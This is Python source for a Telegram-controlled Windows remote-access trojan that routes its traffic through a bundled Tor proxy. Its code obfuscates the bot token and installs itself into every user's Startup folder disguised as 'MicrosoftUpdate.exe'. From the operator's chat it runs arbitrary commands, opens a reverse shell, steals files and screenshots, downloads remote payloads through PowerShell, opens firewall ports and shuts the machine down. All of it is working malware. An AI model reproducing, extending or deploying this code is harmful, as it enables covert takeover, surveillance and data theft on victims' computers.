# i only import the nesserry packages and methods ... for better performance

from telegram import utils , Bot
from telegram.ext import Updater , CommandHandler
from urllib import urlopen
from platform import uname , node , architecture
from subprocess import Popen , PIPE
from os import path , system , remove , listdir
from socket import socket , AF_INET , SOCK_STREAM
import sys
from binascii import a2b_base64
from autopy import bitmap
import pyttsx
from binascii import b2a_base64


# a little bit of obfuscation for token

token = '3kDN0gDN4UjN6EUQFdjSfJ2TIBTZ6ZjRZNHaoB3QvFXbvJDUmVXQJd3YSNGO'
token = token[::-1]
token = a2b_base64(token)
token = token[::-1]

# fix to get tor.exe patch after packing with pyinstaller

def resource_path(relative_path):
	base_path = getattr(sys, '_MEIPASS', path.dirname(path.abspath(__file__)))
	return path.join(base_path, relative_path)

tor_path = resource_path("tor\\tor.exe")

# run tor and  tunnel the bot trafic to the proxy ( local tor proxy )

comm = Popen([tor_path], shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
pp = utils.request.Request(proxy_url='socks5h://127.0.0.1:9050')

tbot = Bot(token=token, request=pp)
update = Updater(bot=tbot)

#lets make our tool persistance

for item in listdir("C:\\Users\\"):
	try:
		if(path.isdir("C:\\Users\\"+item)):
			cmd = 'copy MicrosoftUpdate.exe "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'.format(item)
			Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
	except:
		pass


# method to get ip address of the target

def getIp(bot , update):

	my_ip = urlopen("http://ipecho.net/plain").read()
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Connected To : "+str((my_ip)))

# method to get information about the target system

def getSysInfo(bot , update):

	data = 'OS: '+uname()[0]+' '+uname()[2]+' - '+architecture()[0]+'\n'
	data += 'Node: '+node()+'\n'
	data += 'PC Name: '+uname()[1]+'\n'
	data += 'Version: '+uname()[3]+'\n'
	data += 'System Type: '+uname()[4]+'\n'
	data += 'Description: '+uname()[5]+'\n'

	chat_id = update.message.chat_id
	bot.sendMessage(chat_id,data)

# method to get a list of installed applications on the target machine

def getInstalledApps(bot , update):

	chat_id = update.message.chat_id
	system("wmic product get name >> C:\\Windows\\apps.txt")
	getipfile = open("C:\\Windows\\apps.txt" , "rb")
	bot.sendDocument(chat_id,getipfile,"APPS.txt")
	getipfile.close()

# method to get screen shot from the target machine

def getScreenShot(bot , update):

	shot = bitmap.capture_screen()
	shot.save("c:\\windows\\ScreenShot.png")
	chat_id = update.message.chat_id

	photo = open("c:\\windows\\ScreenShot.png" , "rb")
	bot.sendPhoto(chat_id,photo)
	photo.close()
	system("del C:\\Windows\\ScreenShot.png")

# method to shutdown the target machine

def powerOff(bot , update):

	Popen("shutdown /s /t 1", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id, " Target is in shutdown state !")

# method to show a message box on screen of the target machine

def showMSG(bot , update , args):

	file_ = ""
	for arg in args:
		file_ += arg + ' '

	Popen('echo msgbox("'+file_+'") > c:\\windows\\msg.vbs', shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
	system("start c:\\windows\\msg.vbs")

	chat_id = update.message.chat_id
	bot.sendMessage(chat_id, " message has been seen by target !")


# method to play a audio and tell something to the target

def saysomething(bot , update , args):

	file_ = ""
	for arg in args:
		file_ += arg + ' '

	pyttx_Obj = pyttsx.init()
	pyttx_Obj.setProperty("rate" , 90)
	pyttx_Obj.say(file_)
	pyttx_Obj.runAndWait()
	
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id, " The voice has been played")


# method to show the help of the trojan

def getHelp(bot , update):

	help_ = ""
	help_ += "/showip => Show ip address of the target"+"\n"
	help_ += "/showsysinfo => "+"\n"
	help_ += "/showinstalledapps => show list of installed apps"+"\n"
	help_ += "/getscreenshot => send screen shot"+"\n"
	help_ += "/poweroff => shutdown the target "+"\n"
	help_ += "/showmsg => show a message for target "+"\n"
	help_ += "/changemousebutton => changes buttons of the mouse"+"\n"
	help_ += '/runcmd YOUR COMMAND  => to run a command'+"\n"
	help_ += '/revshell IP PORT  => to gain a reverse shell '+"\n"
	help_ += '/download PATH  => to download a file from the target !'+"\n"
	help_ += '/upload PATH NAME => to upload a file to target !'+"\n"
	help_ += '/say YOUR WORDS => make target computer to speak :D'
	help_ += '\n\n\n Contact me if you have any problem \n\n\n Telegram username : @iAmAwindow \n Email : Maj0rMil4d@gmail.com \n Website : maj0rmil4d.rf.gd \n\n\n GoOdLuck <3'


	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , help_)

# method to reverse action of the mouse buttons


def change_mouse_btn(bot , update):

	system("rundll32 user32,SwapMouseButton")
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id , "Mouse buttons changed Successfully !")

# method to open a port in the firewall of the target ( not functional cause target is behind of nat probably ! )

def openPort(bot , update, args):

	system('netsh firewall add portopening protocol = TCP port = '+args[0]+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
	chat_id = update.message.chat_id
	bot.sendMessage(chat_id,"Port Has Been Opened")

# method to run a command in cmd on the target machine and show the results in the bot CC server

def shell_cmd(bot , update , args):

	try:
		chat_id = update.message.chat_id
		data = ""
		for arg in args:
			data += arg + ' '
		output = Popen(data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE).communicate()
		output = output[0].replace(" ","")

		if len(output) >= 4096:
			bot.sendMessage(chat_id,"Wait output is too big , we will send it as a file")
			file = open('c:\\windows\\DATA_TEL.txt' , 'w')
			file.write(output)
			file.close()
			file = open('c:\\windows\\DATA_TEL.txt' , 'r')
			bot.sendDocument(chat_id,file)
			file.close()
			remove('c:\\windows\\DATA_TEL.txt')
		else :
			bot.sendMessage(chat_id,output)

	except Exception as e:
		print e

# method to get a rev shell on the box !

def reverse_shell(bot , update , args):
		
		sockfd = socket(AF_INET, SOCK_STREAM)
		
		try:	
			data = ""
			for arg in args:
				data += arg + ' '
			ip = data.split(' ')[0]
			port = data.split(' ')[1]
			sockfd.connect((ip, int(port)))
			while True:
				data = sockfd.recv(1024)
				if data == "exit\n":
					sockfd.send("[!] The Reverse shell has been terminated\n")
					break

				comm = Popen(data, shell=True,
										stdout=PIPE,
										stderr=PIPE,
										stdin=PIPE)
				STDOUT, STDERR = comm.communicate()
				sockfd.send(STDOUT)
				sockfd.send(STDERR)

		except Exception as e:
			print e

		finally:

			sockfd.close()

# method to download a file on the target machine

def downloadfile(bot , update , args):

	chat_id = update.message.chat_id
	bot.sendMessage(chat_id,"please wait ... !")

	try:
		file_ = ""
		for arg in args:
			file_ += arg + ' '
		file_ = open(file_ , 'r')
		bot.sendDocument(chat_id,file_)
		file_.close()
	except Exception as e:
		bot.sendMessage(chat_id,"File doesn't exist or the file is empty !")


# method to upload a file on the target machine


def uploadfile(bot , update , args):
	
	chat_id = update.message.chat_id

	try:
		file_ = ""
		for arg in args:
			file_ += arg + ' '
		file_ = file_.split(' ')
		system("powershell.exe Invoke-WebRequest " +file_[0]+" -OutFile "+file_[1])

		bot.sendMessage(chat_id,"Your file has been uploaded on the target machine")

	except :
		bot.sendMessage(chat_id, "Some thing went wrong while uploading !")


def start_event(bot , update):

	chat_id = update.message.chat_id
	bot.sendMessage(chat_id ,

	"""
	Hello , Welcome to SimpleTrojan Managment System <3 \n 
	please use /help to see help menu of the bot !
	"""
					)

# initializing the commands of the bot for the CC server !


ip = CommandHandler("showip" , getIp)
update.dispatcher.add_handler(ip)

sysinfo = CommandHandler("showsysinfo" , getSysInfo)
update.dispatcher.add_handler(sysinfo)

installed_apps = CommandHandler("showinstalledapps" , getInstalledApps)
update.dispatcher.add_handler(installed_apps)

screenshot = CommandHandler("getscreenshot" , getScreenShot)
update.dispatcher.add_handler(screenshot)

shutdown = CommandHandler("poweroff" , powerOff)
update.dispatcher.add_handler(shutdown)

msg = CommandHandler("showmsg" , showMSG , pass_args=True)
update.dispatcher.add_handler(msg)

chmouse = CommandHandler("changemousebutton" , change_mouse_btn)
update.dispatcher.add_handler(chmouse)

oport = CommandHandler("openport" , openPort)
update.dispatcher.add_handler(oport)

he = CommandHandler("help" , getHelp)
update.dispatcher.add_handler(he)

cmd = CommandHandler("runcmd" , shell_cmd , pass_args=True)
update.dispatcher.add_handler(cmd)

rv = CommandHandler("revshell" , reverse_shell , pass_args=True)
update.dispatcher.add_handler(rv)

dl = CommandHandler("download" , downloadfile , pass_args=True)
update.dispatcher.add_handler(dl)

up = CommandHandler("upload" , uploadfile , pass_args=True)
update.dispatcher.add_handler(up)

say = CommandHandler("Say" , saysomething , pass_args=True)
update.dispatcher.add_handler(say)

start = CommandHandler("start" , start_event)
update.dispatcher.add_handler(start)

update.start_polling()
